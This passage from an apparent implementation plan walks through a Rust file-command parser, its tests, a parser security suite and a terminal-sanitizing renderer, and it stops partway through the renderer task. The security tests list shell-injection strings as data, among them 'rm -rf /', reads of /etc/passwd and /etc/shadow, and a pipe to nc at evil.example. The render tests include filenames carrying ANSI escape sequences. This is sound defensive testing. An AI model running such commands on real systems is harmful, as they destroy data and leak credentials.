                Some('t') => content.push('\t'),
                Some('"') => content.push('"'),
                Some('\\') => content.push('\\'),
                Some(other) => return Err(LexError::InvalidEscape(other)),
            },
            Some(ch) => content.push(ch),
        }
    }
}
```

Update `main/crates/fslite-command/src/lib.rs` to add `pub mod lexer;` (public — the parser in Task 4 and the test above both need it).

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p fslite-command --test lexer`
Expected: PASS. If `word` ends up empty when a leading metacharacter is hit (e.g. `;` as the very first character of a would-be word), confirm the outer `tokenize` loop's own boundary check (before calling `read_word`) already rejects it — trace through the `"ls /a; rm /b"` case by hand if any sub-case fails, since `;` there is adjacent to `a` with no space (`a;`), meaning it is caught by `read_word`'s in-word check, not the outer loop's check. Fix whichever branch is missing, not the test.

- [ ] **Step 5: Commit**

```bash
git add crates/fslite-command/src/lexer.rs crates/fslite-command/src/lib.rs crates/fslite-command/tests/lexer.rs
git commit -m "feat(fslite-command): constrained tokenizer"
```

---

## Task 4: Parser (verb table → `Command`)

**Files:**
- Create: `main/crates/fslite-command/src/parser.rs`
- Modify: `main/crates/fslite-command/src/lib.rs`
- Test: `main/crates/fslite-command/tests/parser.rs`

**Interfaces:**
- Produces: `pub fn parse(line: &str) -> Result<Command, ParseError>`, `pub enum ParseError { Lex(LexError), UnknownVerb(String), MissingArgument { verb: &'static str, name: &'static str }, InvalidArgument { verb: &'static str, name: &'static str, reason: String }, UnknownFlag { verb: &'static str, flag: String } }`.

- [ ] **Step 1: Write the failing test**

Create `main/crates/fslite-command/tests/parser.rs` (one case per verb from the coverage table, plus error cases):

```rust
use fslite_command::parser::{parse, ParseError};
use fslite_command::Command;
use fslite_core::{CopyOptions, CreateOptions, MutationOptions, StatOptions, TouchOptions, VirtualPath, WriteOptions};

fn path(s: &str) -> VirtualPath {
    VirtualPath::parse(s).unwrap()
}

#[test]
fn usage_takes_no_arguments() {
    assert_eq!(parse("usage").unwrap(), Command::WorkspaceUsage);
}

#[test]
fn stat_defaults_follow_symlinks_true() {
    assert_eq!(
        parse("stat /a.txt").unwrap(),
        Command::Stat { path: path("/a.txt"), options: StatOptions::default() }
    );
}

#[test]
fn stat_no_follow_flag_disables_symlink_resolution() {
    assert_eq!(
        parse("stat /a.txt --no-follow").unwrap(),
        Command::Stat { path: path("/a.txt"), options: StatOptions::default().follow_symlinks(false) }
    );
}

#[test]
fn mkdir_parents_and_exist_ok_flags() {
    assert_eq!(
        parse("mkdir /docs --parents --exist-ok").unwrap(),
        Command::Mkdir {
            path: path("/docs"),
            options: CreateOptions::default().parents(true).exist_ok(true),
        }
    );
}

#[test]
fn write_reads_the_literal_text_flag() {
    assert_eq!(
        parse(r#"write /a.txt --text="hello""#).unwrap(),
        Command::Write { path: path("/a.txt"), bytes: b"hello".to_vec(), options: WriteOptions::default() }
    );
}

#[test]
fn write_requires_exactly_one_payload_source() {
    let err = parse("write /a.txt").unwrap_err();
    assert!(matches!(err, ParseError::MissingArgument { verb: "write", .. }));
}

#[test]
fn cp_takes_two_positional_paths() {
    assert_eq!(
        parse("cp /a /b --recursive --overwrite").unwrap(),
        Command::Copy {
            from: path("/a"),
            to: path("/b"),
            options: CopyOptions::default().recursive(true).overwrite(true),
        }
    );
}

#[test]
fn touch_create_defaults_true_and_can_be_disabled() {
    assert_eq!(
        parse("touch /a.txt --no-create").unwrap(),
        Command::Touch { path: path("/a.txt"), options: TouchOptions::default().create(false) }
    );
}

#[test]
fn trash_accepts_an_optional_expected_revision() {
    assert_eq!(
        parse("trash /a.txt --expected-revision=3").unwrap(),
        Command::Trash {
            path: path("/a.txt"),
            options: MutationOptions::default().expected_revision(fslite_core::Revision::new(3)),
        }
    );
}

#[test]
fn readlink_takes_a_single_path() {
    assert_eq!(parse("readlink /link").unwrap(), Command::ReadLink { path: path("/link") });
}

#[test]
fn purge_takes_a_trash_id() {
    let id = fslite_core::TrashId::new();
    let command = parse(&format!("purge {id}")).unwrap();
    assert_eq!(command, Command::Purge { trash: id });
}

#[test]
fn glob_takes_a_pattern() {
    assert_eq!(
        parse("glob /*.txt").unwrap(),
        Command::Glob { pattern: "/*.txt".to_string(), page: Default::default() }
    );
}

#[test]
fn unknown_verb_is_a_clear_error() {
    assert_eq!(parse("frobnicate /a").unwrap_err(), ParseError::UnknownVerb("frobnicate".to_string()));
}

#[test]
fn unknown_flag_is_a_clear_error() {
    let err = parse("stat /a.txt --bogus").unwrap_err();
    assert!(matches!(err, ParseError::UnknownFlag { verb: "stat", flag } if flag == "bogus"));
}

#[test]
fn empty_line_is_a_missing_verb_error() {
    assert!(parse("").is_err());
    assert!(parse("   ").is_err());
}

#[test]
fn lexer_errors_propagate_as_parse_errors() {
    assert!(matches!(parse("write 'unterminated"), Err(ParseError::Lex(_))));
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p fslite-command --test parser`
Expected: FAIL to compile — `fslite_command::parser` does not exist.

- [ ] **Step 3: Write the minimal implementation**

Create `main/crates/fslite-command/src/parser.rs`. Structure it as: tokenize (Task 3) → split into verb + positional words + flags → per-verb builder function. Given the coverage table has 28 verbs, implement every one; the shape below is fully worked for a representative slice (`usage`, `stat`, `mkdir`, `write`, `cp`, `touch`, `trash`, `readlink`, `purge`, `glob`) and every remaining verb follows the exact same pattern against its `Command` variant's fields from Task 1 — write all 28 arms, not just these, before moving to Step 4:

```rust
//! Verb table: turns tokenized input (Task 3's [`crate::lexer`]) into a
//! typed [`Command`] (Task 1). One arm per verb in the coverage table.

use std::collections::HashMap;

use fslite_core::{
    ContentQuery, CopyOptions, CreateOptions, FindQuery, LinkTarget, MoveOptions,
    MutationOptions, NodeKind, PageRequest, ReadOptions, RemoveOptions, Revision, StatOptions,
    TouchOptions, TrashId, TreeOptions, VirtualPath, WriteOptions,
};

use crate::lexer::{tokenize, LexError, Token};
use crate::Command;

/// Why a line could not be parsed into a [`Command`].
#[derive(Debug, Eq, PartialEq)]
pub enum ParseError {
    Lex(LexError),
    UnknownVerb(String),
    MissingArgument { verb: &'static str, name: &'static str },
    InvalidArgument { verb: &'static str, name: &'static str, reason: String },
    UnknownFlag { verb: &'static str, flag: String },
}

impl From<LexError> for ParseError {
    fn from(err: LexError) -> Self {
        ParseError::Lex(err)
    }
}

struct Args {
    positionals: Vec<String>,
    flags: HashMap<String, Option<String>>,
}

impl Args {
    fn positional(&self, verb: &'static str, index: usize, name: &'static str) -> Result<&str, ParseError> {
        self.positionals
            .get(index)
            .map(String::as_str)
            .ok_or(ParseError::MissingArgument { verb, name })
    }

    fn has_flag(&self, name: &str) -> bool {
        self.flags.contains_key(name)
    }

    fn flag_value(&self, name: &str) -> Option<&str> {
        self.flags.get(name).and_then(|v| v.as_deref())
    }

    fn check_known_flags(&self, verb: &'static str, known: &[&str]) -> Result<(), ParseError> {
        for flag in self.flags.keys() {
            if !known.contains(&flag.as_str()) {
                return Err(ParseError::UnknownFlag { verb, flag: flag.clone() });
            }
        }
        Ok(())
    }

    fn expected_revision(&self, verb: &'static str) -> Result<Option<Revision>, ParseError> {
        match self.flag_value("expected-revision") {
            None => Ok(None),
            Some(raw) => {
                let value: u64 = raw
                    .parse()
                    .map_err(|_| ParseError::InvalidArgument { verb, name: "expected-revision", reason: "must be a non-negative integer".into() })?;
                Revision::new(value)
                    .ok_or(ParseError::InvalidArgument { verb, name: "expected-revision", reason: "must be nonzero".into() })
                    .map(Some)
            }
        }
    }

    fn page(&self) -> PageRequest {
        let mut page = PageRequest::default();
        if let Some(cursor) = self.flag_value("cursor") {
            page = page.cursor(Some(cursor.to_string()));
        }
        if let Some(limit) = self.flag_value("limit").and_then(|v| v.parse().ok()) {
            page = page.limit(limit);
        }
        page
    }
}

fn split(tokens: Vec<Token>) -> (Vec<String>, HashMap<String, Option<String>>) {
    let mut positionals = Vec::new();
    let mut flags = HashMap::new();
    for token in tokens {
        match token {
            Token::Word(word) => positionals.push(word),
            Token::Flag { name, value } => {
                flags.insert(name, value);
            }
        }
    }
    (positionals, flags)
}

fn parse_path(verb: &'static str, name: &'static str, raw: &str) -> Result<VirtualPath, ParseError> {
    VirtualPath::parse(raw).map_err(|e| ParseError::InvalidArgument { verb, name, reason: e.message().to_string() })
}

/// Parses one line of `fslite-command` grammar into a [`Command`].
pub fn parse(line: &str) -> Result<Command, ParseError> {
    let tokens = tokenize(line)?;
    let mut iter = tokens.into_iter();
    let verb_token = iter.next().ok_or(ParseError::MissingArgument { verb: "<line>", name: "verb" })?;
    let verb = match verb_token {
        Token::Word(w) => w,
        Token::Flag { name, .. } => return Err(ParseError::UnknownVerb(format!("--{name}"))),
    };
    let (positionals, flags) = split(iter.collect());
    let args = Args { positionals, flags };

    match verb.as_str() {
        "usage" => Ok(Command::WorkspaceUsage),

        "stat" => {
            args.check_known_flags("stat", &["no-follow"])?;
            let path = parse_path("stat", "path", args.positional("stat", 0, "path")?)?;
            let options = StatOptions::default().follow_symlinks(!args.has_flag("no-follow"));
            Ok(Command::Stat { path, options })
        }

        "exists" => {
            args.check_known_flags("exists", &["no-follow"])?;
            let path = parse_path("exists", "path", args.positional("exists", 0, "path")?)?;
            let options = StatOptions::default().follow_symlinks(!args.has_flag("no-follow"));
            Ok(Command::Exists { path, options })
        }

        "ls" => {
            args.check_known_flags("ls", &["cursor", "limit"])?;
            let path = parse_path("ls", "path", args.positional("ls", 0, "path")?)?;
            Ok(Command::ReadDir { path, page: args.page() })
        }

        "tree" => {
            args.check_known_flags("tree", &["max-depth", "follow-symlinks", "cursor", "limit"])?;
            let path = parse_path("tree", "path", args.positional("tree", 0, "path")?)?;
            let max_depth = args
                .flag_value("max-depth")
                .map(|v| v.parse().map_err(|_| ParseError::InvalidArgument { verb: "tree", name: "max-depth", reason: "must be a non-negative integer".into() }))
                .transpose()?;
            let options = TreeOptions::default().max_depth(max_depth).follow_symlinks(args.has_flag("follow-symlinks"));
            Ok(Command::Tree { path, options, page: args.page() })
        }

        "mkdir" => {
            args.check_known_flags("mkdir", &["parents", "exist-ok", "expected-revision"])?;
            let path = parse_path("mkdir", "path", args.positional("mkdir", 0, "path")?)?;
            let options = CreateOptions::default()
                .parents(args.has_flag("parents"))
                .exist_ok(args.has_flag("exist-ok"))
                .expected_revision(args.expected_revision("mkdir")?);
            Ok(Command::Mkdir { path, options })
        }

        "cat" => {
            args.check_known_flags("cat", &["range", "no-follow"])?;
            let path = parse_path("cat", "path", args.positional("cat", 0, "path")?)?;
            let range = args
                .flag_value("range")
                .map(|raw| {
                    let (start, end) = raw
                        .split_once('-')
                        .ok_or(ParseError::InvalidArgument { verb: "cat", name: "range", reason: "expected START-END".into() })?;
                    let start: u64 = start.parse().map_err(|_| ParseError::InvalidArgument { verb: "cat", name: "range", reason: "invalid start".into() })?;
                    let end: u64 = end.parse().map_err(|_| ParseError::InvalidArgument { verb: "cat", name: "range", reason: "invalid end".into() })?;
                    Ok::<_, ParseError>(fslite_core::ByteRange::new(start, end))
                })
                .transpose()?;
            let options = ReadOptions::default().range(range).follow_symlinks(!args.has_flag("no-follow"));
            Ok(Command::Read { path, options })
        }

        "write" => {
            args.check_known_flags("write", &["text", "no-create", "expected-revision"])?;
            let path = parse_path("write", "path", args.positional("write", 0, "path")?)?;
            let bytes = args
                .flag_value("text")
                .map(|s| s.as_bytes().to_vec())
                .ok_or(ParseError::MissingArgument { verb: "write", name: "--text (or another payload source)" })?;
            let options = WriteOptions::default().create(!args.has_flag("no-create")).expected_revision(args.expected_revision("write")?);
            Ok(Command::Write { path, bytes, options })
        }

        "write-at" => {
            args.check_known_flags("write-at", &["offset", "text", "no-create", "expected-revision"])?;
            let path = parse_path("write-at", "path", args.positional("write-at", 0, "path")?)?;
            let offset: u64 = args
                .flag_value("offset")
                .ok_or(ParseError::MissingArgument { verb: "write-at", name: "--offset" })?
                .parse()
                .map_err(|_| ParseError::InvalidArgument { verb: "write-at", name: "offset", reason: "must be a non-negative integer".into() })?;
            let bytes = args
                .flag_value("text")
                .map(|s| s.as_bytes().to_vec())
                .ok_or(ParseError::MissingArgument { verb: "write-at", name: "--text" })?;
            let options = WriteOptions::default().create(!args.has_flag("no-create")).expected_revision(args.expected_revision("write-at")?);
            Ok(Command::WriteAt { path, offset, bytes, options })
        }

        "append" => {
            args.check_known_flags("append", &["text", "expected-revision"])?;
            let path = parse_path("append", "path", args.positional("append", 0, "path")?)?;
            let bytes = args
                .flag_value("text")
                .map(|s| s.as_bytes().to_vec())
                .ok_or(ParseError::MissingArgument { verb: "append", name: "--text" })?;
            let options = WriteOptions::default().expected_revision(args.expected_revision("append")?);
            Ok(Command::Append { path, bytes, options })
        }

        "truncate" => {
            args.check_known_flags("truncate", &["length", "expected-revision"])?;
            let path = parse_path("truncate", "path", args.positional("truncate", 0, "path")?)?;
            let length: u64 = args
                .flag_value("length")
                .ok_or(ParseError::MissingArgument { verb: "truncate", name: "--length" })?
                .parse()
                .map_err(|_| ParseError::InvalidArgument { verb: "truncate", name: "length", reason: "must be a non-negative integer".into() })?;
            let options = MutationOptions::default().expected_revision(args.expected_revision("truncate")?);
            Ok(Command::Truncate { path, length, options })
        }

        "touch" => {
            args.check_known_flags("touch", &["no-create", "expected-revision"])?;
            let path = parse_path("touch", "path", args.positional("touch", 0, "path")?)?;
            let options = TouchOptions::default().create(!args.has_flag("no-create")).expected_revision(args.expected_revision("touch")?);
            Ok(Command::Touch { path, options })
        }

        "cp" => {
            args.check_known_flags("cp", &["recursive", "overwrite", "expected-revision"])?;
            let from = parse_path("cp", "from", args.positional("cp", 0, "from")?)?;
            let to = parse_path("cp", "to", args.positional("cp", 1, "to")?)?;
            let options = CopyOptions::default()
                .recursive(args.has_flag("recursive"))
                .overwrite(args.has_flag("overwrite"))
                .expected_revision(args.expected_revision("cp")?);
            Ok(Command::Copy { from, to, options })
        }

        "mv" => {
            args.check_known_flags("mv", &["overwrite", "expected-revision"])?;
            let from = parse_path("mv", "from", args.positional("mv", 0, "from")?)?;
            let to = parse_path("mv", "to", args.positional("mv", 1, "to")?)?;
            let options = MoveOptions::default().overwrite(args.has_flag("overwrite")).expected_revision(args.expected_revision("mv")?);
            Ok(Command::Move { from, to, options })
        }

        "rm" => {
            args.check_known_flags("rm", &["recursive", "expected-revision"])?;
            let path = parse_path("rm", "path", args.positional("rm", 0, "path")?)?;
            let options = RemoveOptions::default().recursive(args.has_flag("recursive")).expected_revision(args.expected_revision("rm")?);
            Ok(Command::Remove { path, options })
        }

        "ln" => {
            args.check_known_flags("ln", &["parents", "exist-ok", "expected-revision"])?;
            let target_raw = args.positional("ln", 0, "target")?;
            let link_raw = args.positional("ln", 1, "link")?;
            let target = LinkTarget::parse(target_raw).map_err(|e| ParseError::InvalidArgument { verb: "ln", name: "target", reason: e.message().to_string() })?;
            let link = parse_path("ln", "link", link_raw)?;
            let options = CreateOptions::default()
                .parents(args.has_flag("parents"))
                .exist_ok(args.has_flag("exist-ok"))
                .expected_revision(args.expected_revision("ln")?);
            Ok(Command::Symlink { target, link, options })
        }

        "readlink" => {
            args.check_known_flags("readlink", &[])?;
            let path = parse_path("readlink", "path", args.positional("readlink", 0, "path")?)?;
            Ok(Command::ReadLink { path })
        }

        "trash" => {
            args.check_known_flags("trash", &["expected-revision"])?;
            let path = parse_path("trash", "path", args.positional("trash", 0, "path")?)?;
            let options = MutationOptions::default().expected_revision(args.expected_revision("trash")?);
            Ok(Command::Trash { path, options })
        }

        "trash-ls" => {
            args.check_known_flags("trash-ls", &["cursor", "limit"])?;
            Ok(Command::ListTrash { page: args.page() })
        }

        "restore" => {
            args.check_known_flags("restore", &["to", "expected-revision"])?;
            let raw_id = args.positional("restore", 0, "trash-id")?;
            let trash = TrashId::parse(raw_id).map_err(|_| ParseError::InvalidArgument { verb: "restore", name: "trash-id", reason: "not a valid id".into() })?;
            let destination = args.flag_value("to").map(|raw| parse_path("restore", "to", raw)).transpose()?;
            let options = MutationOptions::default().expected_revision(args.expected_revision("restore")?);
            Ok(Command::Restore { trash, destination, options })
        }

        "purge" => {
            args.check_known_flags("purge", &[])?;
            let raw_id = args.positional("purge", 0, "trash-id")?;
            let trash = TrashId::parse(raw_id).map_err(|_| ParseError::InvalidArgument { verb: "purge", name: "trash-id", reason: "not a valid id".into() })?;
            Ok(Command::Purge { trash })
        }

        "setattr" => {
            args.check_known_flags("setattr", &["value", "expected-revision"])?;
            let path = parse_path("setattr", "path", args.positional("setattr", 0, "path")?)?;
            let key = args.positional("setattr", 1, "key")?.to_string();
            let value = args
                .flag_value("value")
                .map(|s| s.as_bytes().to_vec())
                .ok_or(ParseError::MissingArgument { verb: "setattr", name: "--value" })?;
            let options = MutationOptions::default().expected_revision(args.expected_revision("setattr")?);
            Ok(Command::SetAttribute { path, key, value, options })
        }

        "rmattr" => {
            args.check_known_flags("rmattr", &["expected-revision"])?;
            let path = parse_path("rmattr", "path", args.positional("rmattr", 0, "path")?)?;
            let key = args.positional("rmattr", 1, "key")?.to_string();
            let options = MutationOptions::default().expected_revision(args.expected_revision("rmattr")?);
            Ok(Command::RemoveAttribute { path, key, options })
        }

        "glob" => {
            args.check_known_flags("glob", &["cursor", "limit"])?;
            let pattern = args.positional("glob", 0, "pattern")?.to_string();
            Ok(Command::Glob { pattern, page: args.page() })
        }

        "find" => {
            args.check_known_flags(
                "find",
                &["name-contains", "kind", "min-size", "max-size", "modified-after", "modified-before", "cursor", "limit"],
            )?;
            let root = parse_path("find", "root", args.positional("find", 0, "root")?)?;
            let kind = args
                .flag_value("kind")
                .map(|k| match k {
                    "file" => Ok(NodeKind::File),
                    "directory" => Ok(NodeKind::Directory),
                    "symlink" => Ok(NodeKind::Symlink),
                    other => Err(ParseError::InvalidArgument { verb: "find", name: "kind", reason: format!("unknown kind `{other}`") }),
                })
                .transpose()?;
            let query = FindQuery::default()
                .root(root)
                .name_contains(args.flag_value("name-contains").map(str::to_string))
                .kind(kind)
                .min_logical_size(args.flag_value("min-size").and_then(|v| v.parse().ok()))
                .max_logical_size(args.flag_value("max-size").and_then(|v| v.parse().ok()))
                .modified_after_ms(args.flag_value("modified-after").and_then(|v| v.parse().ok()))
                .modified_before_ms(args.flag_value("modified-before").and_then(|v| v.parse().ok()));
            Ok(Command::Find { query, page: args.page() })
        }

        "grep" => {
            args.check_known_flags("grep", &["cursor", "limit"])?;
            let root = parse_path("grep", "root", args.positional("grep", 0, "root")?)?;
            let needle = args.positional("grep", 1, "needle")?.as_bytes().to_vec();
            let query = ContentQuery::default().root(root).needle(needle);
            Ok(Command::SearchContent { query, page: args.page() })
        }

        "changes" => {
            args.check_known_flags("changes", &["after", "cursor", "limit"])?;
            let after = args.flag_value("after").map(|raw| fslite_core::ChangeCursor::new(raw.to_string()));
            Ok(Command::Changes { after, page: args.page() })
        }

        "batch" => {
            args.check_known_flags("batch", &["file"])?;
            let file = args.flag_value("file").ok_or(ParseError::MissingArgument { verb: "batch", name: "--file" })?;
            let contents = std::fs::read_to_string(file)
                .map_err(|e| ParseError::InvalidArgument { verb: "batch", name: "file", reason: e.to_string() })?;
            let operations: Vec<fslite_core::BatchOperation> = serde_json::from_str(&contents)
                .map_err(|e| ParseError::InvalidArgument { verb: "batch", name: "file", reason: e.to_string() })?;
            Ok(Command::Batch(operations))
        }

        other => Err(ParseError::UnknownVerb(other.to_string())),
    }
}
```

Update `main/crates/fslite-command/src/lib.rs` to add `pub mod parser;`.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p fslite-command --test parser`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add crates/fslite-command/src/parser.rs crates/fslite-command/src/lib.rs crates/fslite-command/tests/parser.rs
git commit -m "feat(fslite-command): verb-table parser"
```

---

## Task 5: Parser security test suite

**Files:**
- Test: `main/crates/fslite-command/tests/parser_security.rs`

No new production code in this task; it is a dedicated, explicit proof of the security properties `Global Constraints` and Tasks 3–4 already established, gathered in one place so they are reviewable as a unit and don't erode silently as the parser evolves.

- [ ] **Step 1: Write the security test suite**

Create `main/crates/fslite-command/tests/parser_security.rs`:

```rust
use fslite_command::lexer::{tokenize, LexError};
use fslite_command::parser::parse;

/// Structural guard: the parser must never shell out. If someone later
/// "helpfully" adds a fallback to `std::process::Command` for an
/// unsupported verb, this test fails the build by scanning the crate's own
/// source for the forbidden identifier, rather than relying on nobody
/// noticing in review.
#[test]
fn crate_source_never_references_process_command() {
    let src_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/src");
    for entry in walk(src_dir) {
        let contents = std::fs::read_to_string(&entry).unwrap();
        assert!(
            !contents.contains("process::Command") && !contents.contains("Command::new"),
            "found a process-spawning call in {entry:?} — fslite-command must never shell out"
        );
    }
}

fn walk(dir: &str) -> Vec<std::path::PathBuf> {
    let mut files = Vec::new();
    for entry in std::fs::read_dir(dir).unwrap() {
        let entry = entry.unwrap();
        let path = entry.path();
        if path.is_dir() {
            files.extend(walk(path.to_str().unwrap()));
        } else if path.extension().is_some_and(|ext| ext == "rs") {
            files.push(path);
        }
    }
    files
}

/// A curated corpus of shell-injection-shaped inputs. None of these should
/// panic, hang, or silently succeed as something other than what they
/// literally say — each is either a clean rejection or, where the syntax is
/// merely unusual rather than a metacharacter, parsed as inert literal text.
#[test]
fn malicious_looking_inputs_never_panic_and_never_expand() {
    let corpus = [
        "rm /a; rm -rf /",
        "rm /a && cat /etc/passwd",
        "rm /a || true",
        "ls /a | nc evil.example 4444",
        "ls `whoami`",
        "ls $(whoami)",
        "write /a.txt --text=$(whoami)",
        "ls /a > /etc/passwd",
        "ls /a < /etc/shadow",
        "ls /a &",
        "ls ~/secret",
        "ls /a/../../../../etc/passwd",
        "stat /a\0.txt",
        "'",
        "\"",
        "write /a.txt --text=''''''''''",
    ];

    for input in corpus {
        // The only acceptable outcomes are Ok(_) or Err(_) — a panic here
        // is the test failure.
        let _ = std::panic::catch_unwind(|| parse(input)).unwrap_or_else(|_| panic!("parse panicked on: {input}"));
    }
}

/// Path traversal is contained by `VirtualPath::parse`'s own normalization
/// (leading `..` segments are popped against an empty stack and dropped,
/// never escaping root) — the parser adds no extra logic and must not need
/// to, since it always routes path text through `VirtualPath::parse`. This
/// test proves the containment holds through the parser's own entry point.
#[test]
fn path_traversal_attempts_are_clamped_to_the_workspace_root_not_rejected_or_escaped() {
    let command = parse("stat /../../../../etc/passwd").unwrap();
    match command {
        fslite_command::Command::Stat { path, .. } => assert_eq!(path.as_str(), "/etc/passwd"),
        other => panic!("expected Stat, got {other:?}"),
    }
}

/// Oversized input is rejected by the lexer's length check before any
/// tokenizing work proportional to a maliciously large line is done.
#[test]
fn multi_megabyte_line_is_rejected_fast() {
    let huge = format!("write /a.txt --text={}", "A".repeat(8 * 1024 * 1024));
    let start = std::time::Instant::now();
    let result = tokenize(&huge);
    let elapsed = start.elapsed();
    assert_eq!(result.unwrap_err(), LexError::TooLong { max: fslite_command::lexer::MAX_LINE_LEN, actual: huge.len() });
    assert!(elapsed < std::time::Duration::from_millis(50), "length check should be near-instant, took {elapsed:?}");
}

/// Deeply nested/repeated quote characters must produce a clean parse
/// error, not a stack overflow or infinite loop — the tokenizer's quote
/// handling is a flat loop, not recursive, but this proves it under load.
#[test]
fn pathological_quote_repetition_terminates_cleanly() {
    let input = format!("write /a.txt --text={}", "'".repeat(100_000));
    let result = std::panic::catch_unwind(|| tokenize(&input));
    assert!(result.is_ok(), "tokenizer should not panic on repeated quote characters");
}
```

- [ ] **Step 2: Run the test**

Run: `cargo test -p fslite-command --test parser_security`
Expected: PASS. If `crate_source_never_references_process_command` fails because a legitimate string elsewhere happens to contain `"Command::new"` (e.g. a doc comment mentioning `LocalExecutor::new` near the word "Command"), tighten the substring check (e.g. require `std::process::Command::new` specifically) rather than deleting the guard.

If `malicious_looking_inputs_never_panic_and_never_expand` reveals a real panic, fix the lexer/parser (not the test) and re-run.

- [ ] **Step 3: Commit**

```bash
git add crates/fslite-command/tests/parser_security.rs
git commit -m "test(fslite-command): parser security suite"
```

---

## Task 6: Renderer (human-readable + `--json`, terminal-escape sanitization)

**Files:**
- Create: `main/crates/fslite-command/src/render.rs`
- Modify: `main/crates/fslite-command/src/lib.rs`
- Test: `main/crates/fslite-command/tests/render.rs`

**Interfaces:**
- Produces: `pub fn render_human(output: &CommandOutput) -> String`, `pub fn render_json(output: &CommandOutput) -> String` (pretty JSON via `serde_json::to_string_pretty`), `pub fn sanitize_for_terminal(raw: &str) -> String` (strips ASCII control bytes below 0x20 except `\n`/`\t`, and the ESC byte `0x1b` specifically, replacing each with nothing — not a visible replacement character, since the goal is removing the escape sequence's trigger byte, not preserving a placeholder).

- [ ] **Step 1: Write the failing test**

Create `main/crates/fslite-command/tests/render.rs`:

```rust
use fslite_command::render::{render_human, render_json, sanitize_for_terminal};
use fslite_command::CommandOutput;
use fslite_core::{Node, NodeId, NodeKind, Revision, WorkspaceId};
use std::collections::BTreeMap;

fn sample_node(name: &str) -> Node {
    Node {
        workspace_id: WorkspaceId::new(),
        id: NodeId::new(),
        parent_id: None,
        name: name.to_string(),
        kind: NodeKind::File,
        logical_size: 5,
        created_at_ms: 0,
        modified_at_ms: 0,
        accessed_at_ms: 0,
        revision: Revision::INITIAL,
        attributes: BTreeMap::new(),
    }
}

#[test]
fn human_rendering_of_a_node_includes_its_name_and_size() {
    let output = CommandOutput::Node(sample_node("a.txt"));
    let rendered = render_human(&output);
    assert!(rendered.contains("a.txt"));
    assert!(rendered.contains('5'));
}

#[test]
fn json_rendering_is_valid_json_matching_the_wire_codec() {
    let output = CommandOutput::Node(sample_node("a.txt"));
    let rendered = render_json(&output);
    let parsed: CommandOutput = serde_json::from_str(&rendered).unwrap();
    assert_eq!(parsed, output);
}

#[test]
fn sanitize_strips_the_escape_byte_that_triggers_ansi_sequences() {
    let malicious = "innocuous.txt\x1b[31mFAKE ERROR\x1b[0m";
    let clean = sanitize_for_terminal(malicious);
    assert!(!clean.contains('\x1b'));
    assert!(clean.contains("innocuous.txt"));
}

#[test]
fn sanitize_strips_other_control_bytes_but_keeps_newline_and_tab() {
    let input = "a\x07b\nc\td";
    let clean = sanitize_for_terminal(input);
    assert_eq!(clean, "ab\nc\td");
}

#[test]
fn human_rendering_of_a_node_with_a_hostile_name_is_sanitized() {
    let hostile_name = "\x1b]0;pwned\x07innocent.txt";
    let output = CommandOutput::Node(sample_node(hostile_name));
    let rendered = render_human(&output);
    assert!(!rendered.contains('\x1b'));
    assert!(rendered.contains("innocent.txt"));
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p fslite-command --test render`
Expected: FAIL to compile — `fslite_command::render` does not exist.

- [ ] **Step 3: Write the minimal implementation**

Create `main/crates/fslite-command/src/render.rs`:

```rust
//! Turns a [`CommandOutput`] into text: either a human-readable summary
//! (used by default in `fslite-cli`) or pretty-printed JSON matching the
//! wire codec exactly (`--json`). Every untrusted string field (node names,
//! attribute keys, link targets) is passed through [`sanitize_for_terminal`]
//! before it reaches a human-readable line, since a malicious filename is
//! attacker-controlled input reaching a real terminal.

use fslite_core::Node;

use crate::CommandOutput;

/// Strips ASCII control bytes (except `\n`/`\t`) — including the ESC byte
/// that begins every ANSI escape sequence — from untrusted text before it
/// is written to a terminal. This removes the trigger byte outright rather
/// than substituting a visible placeholder, since the goal is preventing
/// the escape sequence from being interpreted at all.
pub fn sanitize_for_terminal(raw: &str) -> String {
    raw.chars()
        .filter(|&ch| ch == '\n' || ch == '\t' || !ch.is_control())
        .collect()
}

fn render_node_line(node: &Node) -> String {
    format!(
        "{:<10} {:>10} {}",
        format!("{:?}", node.kind).to_lowercase(),
        node.logical_size,
        sanitize_for_terminal(&node.name)
    )
}

/// Renders a [`CommandOutput`] as human-readable text.
pub fn render_human(output: &CommandOutput) -> String {
    match output {
        CommandOutput::Usage(usage) => format!(
            "active: {} bytes / {} nodes\ntrashed: {} bytes / {} nodes\nquota: {} bytes / {} nodes",
            usage.active_logical_bytes, usage.active_nodes,
            usage.trashed_logical_bytes, usage.trashed_nodes,
            usage.max_logical_bytes, usage.max_nodes,
        ),
        CommandOutput::Node(node) => render_node_line(node),
        CommandOutput::Exists(found) => found.to_string(),
        CommandOutput::Nodes(page) => page.items.iter().map(render_node_line).collect::<Vec<_>>().join("\n"),
        CommandOutput::Tree(page) => page
            .items
            .iter()
            .map(|entry| format!("{}{}", "  ".repeat(entry.depth as usize), sanitize_for_terminal(entry.path.as_str())))
            .collect::<Vec<_>>()
            .join("\n"),
        CommandOutput::Content { bytes, .. } => String::from_utf8_lossy(bytes).into_owned(),
        CommandOutput::Unit => "ok".to_string(),
        CommandOutput::LinkTarget(target) => sanitize_for_terminal(target.as_str()),
        CommandOutput::Trash(entry) => format!(
            "{} (was {})",
            entry.id,
            sanitize_for_terminal(entry.original_path.as_str())
        ),
        CommandOutput::TrashList(page) => page
            .items
            .iter()
            .map(|entry| format!("{} {}", entry.id, sanitize_for_terminal(entry.original_path.as_str())))
            .collect::<Vec<_>>()
            .join("\n"),
        CommandOutput::SearchMatches(page) => page
            .items
            .iter()
            .map(|m| format!("{}: {}", sanitize_for_terminal(m.path.as_str()), sanitize_for_terminal(&String::from_utf8_lossy(&m.preview))))
            .collect::<Vec<_>>()
            .join("\n"),
        CommandOutput::Changes(page) => page
            .items
            .iter()
            .map(|change| format!("{} {:?}", change.sequence, change.kind))
            .collect::<Vec<_>>()
            .join("\n"),
        CommandOutput::Batch(results) => format!("{} operations completed", results.len()),
    }
}

/// Renders a [`CommandOutput`] as pretty-printed JSON, exactly matching the
/// serde wire codec (round-trippable back into a `CommandOutput`).
pub fn render_json(output: &CommandOutput) -> String {
    serde_json::to_string_pretty(output).expect("CommandOutput always serializes")
}
```

Update `main/crates/fslite-command/src/lib.rs` to add `pub mod render;`.

- [ ] **Step 4: Run test to verify it passes**

